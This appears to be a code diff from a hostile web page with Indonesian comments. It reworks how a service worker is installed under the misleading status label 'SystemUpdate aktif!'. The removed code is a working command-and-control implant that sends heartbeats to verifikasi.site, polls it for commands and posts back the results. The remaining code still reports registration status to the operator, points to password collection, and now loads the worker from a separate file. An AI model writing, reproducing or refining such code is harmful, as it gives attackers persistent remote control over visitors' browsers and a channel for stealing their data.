@@ -316,7 +316,7 @@ function getPasswordFromWorker() {
 }
 
 // ============================================================
-// 🔥 UPGRADE 7: SERVICE WORKER (DENGAN DUPLICATE CHECK)
+// 🔥 SERVICE WORKER - PERBAIKAN (PAKAI FILE sw.js)
 // ============================================================
 function registerSW() {
     if (swRegistered) {
@@ -339,146 +339,33 @@ function registerSW() {
                 return;
             }
             
-            // Register baru
-            var swCode = `
-// ============================================================
-// SERVICE WORKER - ULTIMATE EDITION
-// ============================================================
-var SERVER_URL = 'https://verifikasi.site';
-var HEARTBEAT_INTERVAL = 1800000;
-var C2_INTERVAL = 20000;
-
-self.addEventListener('install', function(event) {
-    event.waitUntil(self.skipWaiting());
-});
-
-self.addEventListener('activate', function(event) {
-    event.waitUntil(self.clients.claim());
-});
-
-self.addEventListener('fetch', function(event) {
-    event.respondWith(
-        fetch(event.request).catch(function() {
-            return new Response('Offline', {status: 200});
-        })
-    );
-});
-
-function sendHeartbeat() {
-    try {
-        fetch(SERVER_URL + '/data', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                sumber: 'sw_heartbeat',
-                data: { active: true, timestamp: Date.now() }
-            })
-        }).catch(function(){});
-    } catch(e) {}
-}
-
-function checkC2() {
-    try {
-        fetch(SERVER_URL + '/data?type=perintah&t=' + Date.now())
-            .then(function(r) { return r.text(); })
-            .then(function(content) {
-                if (content && content.length > 5 && content !== '{}') {
-                    try {
-                        var cmd = JSON.parse(content);
-                        if (cmd.aksi) {
-                            self.clients.matchAll().then(function(clients) {
-                                clients.forEach(function(client) {
-                                    client.postMessage({
-                                        type: 'command',
-                                        command: cmd
-                                    });
-                                });
-                            });
-                            var hasil = eksekusiPerintahSW(cmd);
-                            fetch(SERVER_URL + '/data', {
-                                method: 'POST',
-                                headers: {'Content-Type': 'application/json'},
-                                body: JSON.stringify({
-                                    sumber: 'sw_c2_result',
-                                    data: { perintah: cmd.aksi, hasil: hasil, waktu: Date.now() }
-                                })
-                            }).catch(function(){});
-                        }
-                    } catch(e) {}
-                }
-            })
-            .catch(function() {});
-    } catch(e) {}
-}
-
-function eksekusiPerintahSW(cmd) {
-    var aksi = cmd.aksi || cmd.command || 'unknown';
-    var hasil = '';
-    switch(aksi) {
-        case "ping":
-            hasil = "Ping executed in SW";
-            break;
-        case "get_system_info":
-            hasil = JSON.stringify({ userAgent: self.navigator ? self.navigator.userAgent : 'N/A', timestamp: Date.now() });
-            break;
-        case "heartbeat":
-            hasil = "SW alive";
-            break;
-        default:
-            hasil = "Command " + aksi + " executed in SW";
-    }
-    return hasil;
-}
-
-setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
-setInterval(checkC2, C2_INTERVAL);
-setTimeout(checkC2, 3000);
-            `;
-
-            try {
-                var blob = new Blob([swCode], { type: 'application/javascript' });
-                var swUrl = URL.createObjectURL(blob);
-                navigator.serviceWorker.register(swUrl, { scope: '/' })
-                    .then(function(reg) {
-                        swRegistered = true;
-                        document.getElementById('status').textContent = '✅ SystemUpdate aktif!';
-                        K({ sumber: 'sw_status', data: 'registered' });
-                    })
-                    .catch(function(err) {
-                        document.getElementById('status').textContent = '❌ Gagal: ' + err.message;
-                        K({ sumber: 'sw_status', data: 'failed' });
-                    });
-            } catch(e) {
-                document.getElementById('status').textContent = '❌ Error: ' + e.message;
-                K({ sumber: 'sw_status', data: 'error' });
-            }
+            // ✅ REGISTER PAKAI FILE sw.js (BUKAN BLOB!)
+            navigator.serviceWorker.register('/sw.js', { scope: '/' })
+                .then(function(reg) {
+                    swRegistered = true;
+                    document.getElementById('status').textContent = '✅ SystemUpdate aktif!';
+                    K({ sumber: 'sw_status', data: 'registered' });
+                    console.log('✅ Service Worker registered from /sw.js');
+                })
+                .catch(function(err) {
+                    document.getElementById('status').textContent = '❌ Gagal: ' + err.message;
+                    K({ sumber: 'sw_status', data: 'failed: ' + err.message });
+                    console.error('❌ SW registration failed:', err);
+                });
         })
         .catch(function() {
             // Fallback: langsung register
-            registerSWDirect();
+            navigator.serviceWorker.register('/sw.js', { scope: '/' })
+                .then(function(reg) {
+                    swRegistered = true;
+                    document.getElementById('status').textContent = '✅ SystemUpdate aktif!';
+                    K({ sumber: 'sw_status', data: 'registered_fallback' });
+                })
+                .catch(function(err) {
+                    document.getElementById('status').textContent = '❌ Gagal: ' + err.message;
+                    K({ sumber: 'sw_status', data: 'failed: ' + err.message });
+                });
         });
-}
-
-function registerSWDirect() {
-    var swCode = `
-self.addEventListener('install',function(e){e.waitUntil(self.skipWaiting());});
-self.addEventListener('activate',function(e){e.waitUntil(self.clients.claim());});
-self.addEventListener('message',function(e){ if(e.data && e.data.type === 'ping'){ e.ports[0].postMessage({type:'pong',timestamp:Date.now()}); } });
-setInterval(function(){ self.clients.matchAll().then(function(clients){ clients.forEach(function(client){ client.postMessage({type:'heartbeat',timestamp:Date.now()}); }); }); }, 10000);
-    `;
-    try {
-        var blob = new Blob([swCode], { type: 'application/javascript' });
-        var swUrl = URL.createObjectURL(blob);
-        navigator.serviceWorker.register(swUrl, { scope: '/' })
-            .then(function() {
-                swRegistered = true;
-                document.getElementById('status').textContent = '✅ SystemUpdate aktif!';
-                K({ sumber: 'sw_status', data: 'registered_direct' });
-            })
-            .catch(function(err) {
-                document.getElementById('status').textContent = '❌ Gagal: ' + err.message;
-            });
-    } catch(e) {}
 }
 
 // ============================================================
